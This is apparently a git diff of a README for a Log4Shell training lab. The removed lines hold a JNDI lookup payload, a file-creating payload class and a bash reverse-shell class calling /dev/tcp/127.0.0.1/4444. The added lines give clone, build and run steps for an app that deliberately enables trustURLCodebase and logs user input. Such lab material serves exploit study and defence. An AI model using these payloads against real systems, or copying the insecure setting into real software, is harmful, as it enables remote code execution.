@@ -1,10 +1,6 @@
 # Basic JAR Application
 
-### Vuln App
-
 ```
-package com.log4jshell;
-
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -12,52 +8,43 @@ public class App {
     private static final Logger logger = LogManager.getLogger(App.class);
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
-        logger.error("${jndi:ldap://127.0.0.1:1389/Run}");
+        String command = args[0];
+        logger.error("Execute: " + command);
     }
 }
 ```
 
-## CreateFile Payload
+## Clone Repo
 
 ```
-import java.io.File;  // Import the File class
-import java.io.IOException;  // Import the IOException class to handle errors
-
-public class CreateFile {
-    public CreateFile() {}
-    static {
-      try {
-        File myObj = new File("filename.txt");
-        if (myObj.createNewFile()) {
-          System.out.println("File created: " + myObj.getName());
-        } else {
-          System.out.println("File already exists.");
-        }
-      } catch (IOException e) {
-        System.out.println("An error occurred.");
-        e.printStackTrace();
-      }
-    }
-    public static void main(String[] args) {
-        CreateFile e = new CreateFile();
-    }
-}
+git clone https://github.com/Cyb3rWard0g/log4jshell-lab
 ```
 
-## Reverse Shell - Bash
+## Compile
+
+### Docker
 
 ```
-public class Run {
-  static {
-    try {
-      String[] arrayOfString = {"/bin/bash","-c","/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"};
-      Runtime runtime = Runtime.getRuntime();
-      Process process = runtime.exec(arrayOfString);
-      process.waitFor();
-    }
-    catch (Exception exception) {
-      System.out.println(exception.toString());
-    }
-  }
-}
+cd log4jshell-lab/vulnApps/basicJar
+docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
 ```
+
+### Manually
+```
+cd log4jshell-lab/vulnApps/basicJar
+mvn -f pom.xml clean package -DskipTests
+```
+
+## Run Application
+
+```
+cd log4jshell-lab/vulnApps/basicJar
+java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App "Command"
+```
+
+```
+06:29:08.316 [main] ERROR com.log4jshell.App - Execute: Command
+```
+
+
+
